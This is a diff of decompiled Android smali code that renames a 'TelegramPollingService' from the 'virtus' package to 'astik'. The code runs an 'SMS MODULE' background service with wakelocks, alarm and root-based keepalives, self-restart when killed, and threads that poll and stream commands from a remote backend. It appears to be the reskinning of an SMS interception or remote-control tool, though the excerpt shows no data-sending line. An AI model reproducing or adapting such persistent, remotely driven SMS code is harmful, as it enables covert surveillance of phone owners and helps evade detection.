-    iput-boolean v7, p0, Lcom/virtus/module/TelegramPollingService;->streamStop:Z
+    iput-boolean v7, p0, Lcom/astik/module/TelegramPollingService;->streamStop:Z
 
     .line 502
-    iget-object v1, p0, Lcom/virtus/module/TelegramPollingService;->streamThread:Ljava/lang/Thread;
+    iget-object v1, p0, Lcom/astik/module/TelegramPollingService;->streamThread:Ljava/lang/Thread;
     :try_end_2
     .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1
     .catchall {:try_start_2 .. :try_end_2} :catchall_0
@@ -1695,10 +1657,10 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     :catch_0
     :cond_6
     :try_start_4
-    iput-boolean v2, p0, Lcom/virtus/module/TelegramPollingService;->streamStop:Z
+    iput-boolean v2, p0, Lcom/astik/module/TelegramPollingService;->streamStop:Z
 
     .line 504
-    invoke-direct {p0}, Lcom/virtus/module/TelegramPollingService;->startStreamThread()V
+    invoke-direct {p0}, Lcom/astik/module/TelegramPollingService;->startStreamThread()V
     :try_end_4
     .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1
     .catchall {:try_start_4 .. :try_end_4} :catchall_0
@@ -1715,7 +1677,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     :cond_8
     :goto_3
     :try_start_5
-    iput-boolean v2, p0, Lcom/virtus/module/TelegramPollingService;->monitoring:Z
+    iput-boolean v2, p0, Lcom/astik/module/TelegramPollingService;->monitoring:Z
     :try_end_5
     .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1
     .catchall {:try_start_5 .. :try_end_5} :catchall_0
@@ -1805,11 +1767,11 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     .line 392
     new-instance v0, Ljava/lang/Thread;
 
-    new-instance v1, Lcom/virtus/module/TelegramPollingService$4;
+    new-instance v1, Lcom/astik/module/TelegramPollingService$4;
 
-    invoke-direct {v1, p0, p2, p3, p1}, Lcom/virtus/module/TelegramPollingService$4;-><init>(Lcom/virtus/module/TelegramPollingService;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
+    invoke-direct {v1, p0, p2, p3, p1}, Lcom/astik/module/TelegramPollingService$4;-><init>(Lcom/astik/module/TelegramPollingService;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
 
-    const-string p1, "virtus-fb-retry"
+    const-string p1, "astik-fb-retry"
 
     invoke-direct {v0, v1, p1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V
 
@@ -1827,11 +1789,11 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     const-string v1, "FB stream connected: "
 
     .line 253
-    const-string v2, "virtus_module_prefs"
+    const-string v2, "astik_module_prefs"
 
     const/4 v3, 0x0
 
-    invoke-virtual {p0, v2, v3}, Lcom/virtus/module/TelegramPollingService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
+    invoke-virtual {p0, v2, v3}, Lcom/astik/module/TelegramPollingService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
 
     move-result-object v2
 
@@ -1849,7 +1811,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     move-result v6
 
-    const-string v7, "VirtusModule"
+    const-string v7, "AstikModule"
 
     if-eqz v6, :cond_0
 
@@ -1862,7 +1824,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     .line 260
     :cond_0
-    invoke-direct {p0, v2}, Lcom/virtus/module/TelegramPollingService;->chosenSourcePath(Landroid/content/SharedPreferences;)Ljava/lang/String;
+    invoke-direct {p0, v2}, Lcom/astik/module/TelegramPollingService;->chosenSourcePath(Landroid/content/SharedPreferences;)Ljava/lang/String;
 
     move-result-object v2
 
@@ -1889,7 +1851,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    iget-object v2, p0, Lcom/virtus/module/TelegramPollingService;->cfgKey:Ljava/lang/String;
+    iget-object v2, p0, Lcom/astik/module/TelegramPollingService;->cfgKey:Ljava/lang/String;
 
     invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z
 
@@ -1906,7 +1868,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     invoke-direct {v2, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
 
-    iget-object v5, p0, Lcom/virtus/module/TelegramPollingService;->cfgKey:Ljava/lang/String;
+    iget-object v5, p0, Lcom/astik/module/TelegramPollingService;->cfgKey:Ljava/lang/String;
 
     invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
@@ -2095,11 +2057,11 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     .line 300
     :cond_6
     :goto_2
-    iget-boolean v4, p0, Lcom/virtus/module/TelegramPollingService;->isRunning:Z
+    iget-boolean v4, p0, Lcom/astik/module/TelegramPollingService;->isRunning:Z
 
     if-eqz v4, :cond_a
 
-    iget-boolean v4, p0, Lcom/virtus/module/TelegramPollingService;->streamStop:Z
+    iget-boolean v4, p0, Lcom/astik/module/TelegramPollingService;->streamStop:Z
 
     if-nez v4, :cond_a
 
@@ -2155,7 +2117,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     if-eqz v5, :cond_6
 
     .line 305
-    invoke-direct {p0, v4}, Lcom/virtus/module/TelegramPollingService;->handleEvent(Ljava/lang/String;)V
+    invoke-direct {p0, v4}, Lcom/astik/module/TelegramPollingService;->handleEvent(Ljava/lang/String;)V
 
     goto :goto_2
 
@@ -2191,7 +2153,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     move-result-object v4
 
-    invoke-direct {p0, v4}, Lcom/virtus/module/TelegramPollingService;->handleEvent(Ljava/lang/String;)V
+    invoke-direct {p0, v4}, Lcom/astik/module/TelegramPollingService;->handleEvent(Ljava/lang/String;)V
     :try_end_4
     .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0
     .catchall {:try_start_4 .. :try_end_4} :catchall_0
@@ -2337,22 +2299,22 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     .catch Ljava/lang/InterruptedException; {:try_start_7 .. :try_end_7} :catch_3
 
     .line 264
-    iget-boolean v0, p0, Lcom/virtus/module/TelegramPollingService;->streamStop:Z
+    iget-boolean v0, p0, Lcom/astik/module/TelegramPollingService;->streamStop:Z
 
     if-nez v0, :cond_d
 
     .line 265
     new-instance v0, Ljava/lang/Thread;
 
-    new-instance v1, Lcom/virtus/module/TelegramPollingService$3;
+    new-instance v1, Lcom/astik/module/TelegramPollingService$3;
 
-    invoke-direct {v1, p0}, Lcom/virtus/module/TelegramPollingService$3;-><init>(Lcom/virtus/module/TelegramPollingService;)V
+    invoke-direct {v1, p0}, Lcom/astik/module/TelegramPollingService$3;-><init>(Lcom/astik/module/TelegramPollingService;)V
 
-    const-string v2, "virtus-sse"
+    const-string v2, "astik-sse"
 
     invoke-direct {v0, v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V
 
-    iput-object v0, p0, Lcom/virtus/module/TelegramPollingService;->streamThread:Ljava/lang/Thread;
+    iput-object v0, p0, Lcom/astik/module/TelegramPollingService;->streamThread:Ljava/lang/Thread;
 
     const/4 v1, 0x1
 
@@ -2360,7 +2322,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     invoke-virtual {v0, v1}, Ljava/lang/Thread;->setDaemon(Z)V
 
     .line 269
-    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService;->streamThread:Ljava/lang/Thread;
+    iget-object v0, p0, Lcom/astik/module/TelegramPollingService;->streamThread:Ljava/lang/Thread;
 
     invoke-virtual {v0}, Ljava/lang/Thread;->start()V
 
@@ -2377,7 +2339,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     :try_start_0
     const-string v0, "alarm"
 
-    invoke-virtual {p0, v0}, Lcom/virtus/module/TelegramPollingService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+    invoke-virtual {p0, v0}, Lcom/astik/module/TelegramPollingService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
 
     move-result-object v0
 
@@ -2388,11 +2350,11 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     .line 153
     new-instance v0, Landroid/content/Intent;
 
-    const-class v2, Lcom/virtus/module/TelegramPollingService;
+    const-class v2, Lcom/astik/module/TelegramPollingService;
 
     invoke-direct {v0, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
 
-    const-string v2, "virtus.keepalive"
+    const-string v2, "astik.keepalive"
 
     invoke-virtual {v0, v2}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;
 
@@ -2462,7 +2424,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     move-result-object v0
 
-    const-string v1, "VirtusModule"
+    const-string v1, "AstikModule"
 
     invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
 
@@ -2475,11 +2437,11 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     .line 181
     new-instance v0, Ljava/lang/Thread;
 
-    new-instance v1, Lcom/virtus/module/TelegramPollingService$1;
+    new-instance v1, Lcom/astik/module/TelegramPollingService$1;
 
-    invoke-direct {v1, p0}, Lcom/virtus/module/TelegramPollingService$1;-><init>(Lcom/virtus/module/TelegramPollingService;)V
+    invoke-direct {v1, p0}, Lcom/astik/module/TelegramPollingService$1;-><init>(Lcom/astik/module/TelegramPollingService;)V
 
-    const-string v2, "virtus-fb-config"
+    const-string v2, "astik-fb-config"
 
     invoke-direct {v0, v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V
 
@@ -2498,7 +2460,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     .locals 3
 
     .line 447
-    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService;->pollThread:Ljava/lang/Thread;
+    iget-object v0, p0, Lcom/astik/module/TelegramPollingService;->pollThread:Ljava/lang/Thread;
 
     if-eqz v0, :cond_0
 
@@ -2514,15 +2476,15 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     :cond_0
     new-instance v0, Ljava/lang/Thread;
 
-    new-instance v1, Lcom/virtus/module/TelegramPollingService$6;
+    new-instance v1, Lcom/astik/module/TelegramPollingService$6;
 
-    invoke-direct {v1, p0}, Lcom/virtus/module/TelegramPollingService$6;-><init>(Lcom/virtus/module/TelegramPollingService;)V
+    invoke-direct {v1, p0}, Lcom/astik/module/TelegramPollingService$6;-><init>(Lcom/astik/module/TelegramPollingService;)V
 
-    const-string v2, "virtus-fb-poll"
+    const-string v2, "astik-fb-poll"
 
     invoke-direct {v0, v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V
 
-    iput-object v0, p0, Lcom/virtus/module/TelegramPollingService;->pollThread:Ljava/lang/Thread;
+    iput-object v0, p0, Lcom/astik/module/TelegramPollingService;->pollThread:Ljava/lang/Thread;
 
     const/4 v1, 0x1
 
@@ -2530,7 +2492,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     invoke-virtual {v0, v1}, Ljava/lang/Thread;->setDaemon(Z)V
 
     .line 458
-    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService;->pollThread:Ljava/lang/Thread;
+    iget-object v0, p0, Lcom/astik/module/TelegramPollingService;->pollThread:Ljava/lang/Thread;
 
     invoke-virtual {v0}, Ljava/lang/Thread;->start()V
 
@@ -2541,7 +2503,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     .locals 3
 
     .line 231
-    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService;->streamThread:Ljava/lang/Thread;
+    iget-object v0, p0, Lcom/astik/module/TelegramPollingService;->streamThread:Ljava/lang/Thread;
 
     if-eqz v0, :cond_0
 
@@ -2557,15 +2519,15 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     :cond_0
     new-instance v0, Ljava/lang/Thread;
 
-    new-instance v1, Lcom/virtus/module/TelegramPollingService$2;
+    new-instance v1, Lcom/astik/module/TelegramPollingService$2;
 
-    invoke-direct {v1, p0}, Lcom/virtus/module/TelegramPollingService$2;-><init>(Lcom/virtus/module/TelegramPollingService;)V
+    invoke-direct {v1, p0}, Lcom/astik/module/TelegramPollingService$2;-><init>(Lcom/astik/module/TelegramPollingService;)V
 
-    const-string v2, "virtus-fb-stream"
+    const-string v2, "astik-fb-stream"
 
     invoke-direct {v0, v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V
 
-    iput-object v0, p0, Lcom/virtus/module/TelegramPollingService;->streamThread:Ljava/lang/Thread;
+    iput-object v0, p0, Lcom/astik/module/TelegramPollingService;->streamThread:Ljava/lang/Thread;
 
     const/4 v1, 0x1
 
@@ -2573,7 +2535,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     invoke-virtual {v0, v1}, Ljava/lang/Thread;->setDaemon(Z)V
 
     .line 249
-    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService;->streamThread:Ljava/lang/Thread;
+    iget-object v0, p0, Lcom/astik/module/TelegramPollingService;->streamThread:Ljava/lang/Thread;
 
     invoke-virtual {v0}, Ljava/lang/Thread;->start()V
 
@@ -2597,31 +2559,31 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     invoke-super {p0}, Landroid/app/Service;->onCreate()V
 
     .line 80
-    invoke-direct {p0}, Lcom/virtus/module/TelegramPollingService;->createNotificationChannel()V
+    invoke-direct {p0}, Lcom/astik/module/TelegramPollingService;->createNotificationChannel()V
 
     .line 81
-    const-string v0, "VIRTUS SMS MODULE \u2014 running"
+    const-string v0, "ASTIK SMS MODULE \u2014 running"
 
-    invoke-direct {p0, v0}, Lcom/virtus/module/TelegramPollingService;->buildNotification(Ljava/lang/String;)Landroid/app/Notification;
+    invoke-direct {p0, v0}, Lcom/astik/module/TelegramPollingService;->buildNotification(Ljava/lang/String;)Landroid/app/Notification;
 
     move-result-object v0
 
     const/16 v1, 0x3e7
 
-    invoke-virtual {p0, v1, v0}, Lcom/virtus/module/TelegramPollingService;->startForeground(ILandroid/app/Notification;)V
+    invoke-virtual {p0, v1, v0}, Lcom/astik/module/TelegramPollingService;->startForeground(ILandroid/app/Notification;)V
 
     .line 84
     :try_start_0
     const-string v0, "power"
 
-    invoke-virtual {p0, v0}, Lcom/virtus/module/TelegramPollingService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+    invoke-virtual {p0, v0}, Lcom/astik/module/TelegramPollingService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
 
     move-result-object v0
 
     check-cast v0, Landroid/os/PowerManager;
 
     .line 85
-    const-string v1, "virtus:keepalive"
+    const-string v1, "astik:keepalive"
 
     const/4 v2, 0x1
 
@@ -2629,7 +2591,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     move-result-object v0
 
-    iput-object v0, p0, Lcom/virtus/module/TelegramPollingService;->wakeLock:Landroid/os/PowerManager$WakeLock;
+    iput-object v0, p0, Lcom/astik/module/TelegramPollingService;->wakeLock:Landroid/os/PowerManager$WakeLock;
 
     const/4 v1, 0x0
 
@@ -2637,7 +2599,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     invoke-virtual {v0, v1}, Landroid/os/PowerManager$WakeLock;->setReferenceCounted(Z)V
 
     .line 87
-    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService;->wakeLock:Landroid/os/PowerManager$WakeLock;
+    iget-object v0, p0, Lcom/astik/module/TelegramPollingService;->wakeLock:Landroid/os/PowerManager$WakeLock;
 
     const-wide/32 v1, 0x1b7740
 
@@ -2667,16 +2629,16 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     move-result-object v0
 
-    const-string v1, "VirtusModule"
+    const-string v1, "AstikModule"
 
     invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
 
     .line 90
     :goto_0
-    invoke-direct {p0}, Lcom/virtus/module/TelegramPollingService;->applyRootKeepAlive()V
+    invoke-direct {p0}, Lcom/astik/module/TelegramPollingService;->applyRootKeepAlive()V
 
     .line 92
-    invoke-direct {p0}, Lcom/virtus/module/TelegramPollingService;->scheduleKeepAlive()V
+    invoke-direct {p0}, Lcom/astik/module/TelegramPollingService;->scheduleKeepAlive()V
 
     return-void
 .end method
@@ -2690,18 +2652,18 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     const/4 v0, 0x0
 
     .line 128
-    iput-boolean v0, p0, Lcom/virtus/module/TelegramPollingService;->isRunning:Z
+    iput-boolean v0, p0, Lcom/astik/module/TelegramPollingService;->isRunning:Z
 
     const/4 v0, 0x1
 
     .line 129
-    iput-boolean v0, p0, Lcom/virtus/module/TelegramPollingService;->streamStop:Z
+    iput-boolean v0, p0, Lcom/astik/module/TelegramPollingService;->streamStop:Z
 
     .line 130
-    iput-boolean v0, p0, Lcom/virtus/module/TelegramPollingService;->pollStop:Z
+    iput-boolean v0, p0, Lcom/astik/module/TelegramPollingService;->pollStop:Z
 
     .line 131
-    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService;->streamThread:Ljava/lang/Thread;
+    iget-object v0, p0, Lcom/astik/module/TelegramPollingService;->streamThread:Ljava/lang/Thread;
 
     const/4 v1, 0x0
 
@@ -2711,11 +2673,11 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V
 
     .line 133
-    iput-object v1, p0, Lcom/virtus/module/TelegramPollingService;->streamThread:Ljava/lang/Thread;
+    iput-object v1, p0, Lcom/astik/module/TelegramPollingService;->streamThread:Ljava/lang/Thread;
 
     .line 135
     :cond_0
-    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService;->pollThread:Ljava/lang/Thread;
+    iget-object v0, p0, Lcom/astik/module/TelegramPollingService;->pollThread:Ljava/lang/Thread;
 
     if-eqz v0, :cond_1
 
@@ -2723,12 +2685,12 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V
 
     .line 137
-    iput-object v1, p0, Lcom/virtus/module/TelegramPollingService;->pollThread:Ljava/lang/Thread;
+    iput-object v1, p0, Lcom/astik/module/TelegramPollingService;->pollThread:Ljava/lang/Thread;
 
     .line 140
     :cond_1
     :try_start_0
-    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService;->wakeLock:Landroid/os/PowerManager$WakeLock;
+    iget-object v0, p0, Lcom/astik/module/TelegramPollingService;->wakeLock:Landroid/os/PowerManager$WakeLock;
 
     if-eqz v0, :cond_2
 
@@ -2738,7 +2700,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     if-eqz v0, :cond_2
 
-    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService;->wakeLock:Landroid/os/PowerManager$WakeLock;
+    iget-object v0, p0, Lcom/astik/module/TelegramPollingService;->wakeLock:Landroid/os/PowerManager$WakeLock;
 
     invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V
     :try_end_0
@@ -2750,16 +2712,16 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     :try_start_1
     new-instance v0, Landroid/content/Intent;
 
-    invoke-virtual {p0}, Lcom/virtus/module/TelegramPollingService;->getApplicationContext()Landroid/content/Context;
+    invoke-virtual {p0}, Lcom/astik/module/TelegramPollingService;->getApplicationContext()Landroid/content/Context;
 
     move-result-object v1
 
-    const-class v2, Lcom/virtus/module/TelegramPollingService;
+    const-class v2, Lcom/astik/module/TelegramPollingService;
 
     invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
 
     .line 145
-    invoke-virtual {p0, v0}, Lcom/virtus/module/TelegramPollingService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+    invoke-virtual {p0, v0}, Lcom/astik/module/TelegramPollingService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
     :try_end_1
     .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1
 
@@ -2773,30 +2735,30 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     const/4 p1, 0x1
 
     .line 97
-    iput-boolean p1, p0, Lcom/virtus/module/TelegramPollingService;->isRunning:Z
+    iput-boolean p1, p0, Lcom/astik/module/TelegramPollingService;->isRunning:Z
 
     const/4 p2, 0x0
 
     .line 98
-    iput-boolean p2, p0, Lcom/virtus/module/TelegramPollingService;->streamStop:Z
+    iput-boolean p2, p0, Lcom/astik/module/TelegramPollingService;->streamStop:Z
 
     .line 99
-    iput-boolean p2, p0, Lcom/virtus/module/TelegramPollingService;->pollStop:Z
+    iput-boolean p2, p0, Lcom/astik/module/TelegramPollingService;->pollStop:Z
 
     .line 100
-    invoke-direct {p0}, Lcom/virtus/module/TelegramPollingService;->startStreamThread()V
+    invoke-direct {p0}, Lcom/astik/module/TelegramPollingService;->startStreamThread()V
 
     .line 101
-    invoke-direct {p0}, Lcom/virtus/module/TelegramPollingService;->startPollThread()V
+    invoke-direct {p0}, Lcom/astik/module/TelegramPollingService;->startPollThread()V
 
     .line 102
-    invoke-direct {p0}, Lcom/virtus/module/TelegramPollingService;->startConfigThread()V
+    invoke-direct {p0}, Lcom/astik/module/TelegramPollingService;->startConfigThread()V
 
     .line 105
     :try_start_0
     const-string p2, "notification"
 
-    invoke-virtual {p0, p2}, Lcom/virtus/module/TelegramPollingService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+    invoke-virtual {p0, p2}, Lcom/astik/module/TelegramPollingService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
 
     move-result-object p2
 
@@ -2805,7 +2767,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     if-eqz p2, :cond_1
 
     .line 107
-    sget-boolean p3, Lcom/virtus/module/TelegramPollingService;->cfgMonitoring:Z
+    sget-boolean p3, Lcom/astik/module/TelegramPollingService;->cfgMonitoring:Z
 
     if-eqz p3, :cond_0
 
@@ -2818,7 +2780,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     .line 106
     :goto_0
-    invoke-direct {p0, p3}, Lcom/virtus/module/TelegramPollingService;->buildNotification(Ljava/lang/String;)Landroid/app/Notification;
+    invoke-direct {p0, p3}, Lcom/astik/module/TelegramPollingService;->buildNotification(Ljava/lang/String;)Landroid/app/Notification;
 
     move-result-object p3
 
@@ -2843,16 +2805,16 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     :try_start_0
     new-instance p1, Landroid/content/Intent;
 
-    invoke-virtual {p0}, Lcom/virtus/module/TelegramPollingService;->getApplicationContext()Landroid/content/Context;
+    invoke-virtual {p0}, Lcom/astik/module/TelegramPollingService;->getApplicationContext()Landroid/content/Context;
 
     move-result-object v0
 
-    const-class v1, Lcom/virtus/module/TelegramPollingService;
+    const-class v1, Lcom/astik/module/TelegramPollingService;
 
     invoke-direct {p1, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
 
     .line 118
-    invoke-virtual {p0, p1}, Lcom/virtus/module/TelegramPollingService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+    invoke-virtual {p0, p1}, Lcom/astik/module/TelegramPollingService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
 
     .line 119
     sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
@@ -2862,7 +2824,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
     if-lt v0, v1, :cond_0
 
     .line 120
-    invoke-virtual {p0, p1}, Lcom/virtus/module/TelegramPollingService;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
+    invoke-virtual {p0, p1}, Lcom/astik/module/TelegramPollingService;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
     :try_end_0
     .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
 
@@ -2888,7 +2850,7 @@ invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     move-result-object p1
 
-    const-string v0, "VirtusModule"
+    const-string v0, "AstikModule"
 
     invoke-static {v0, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
 
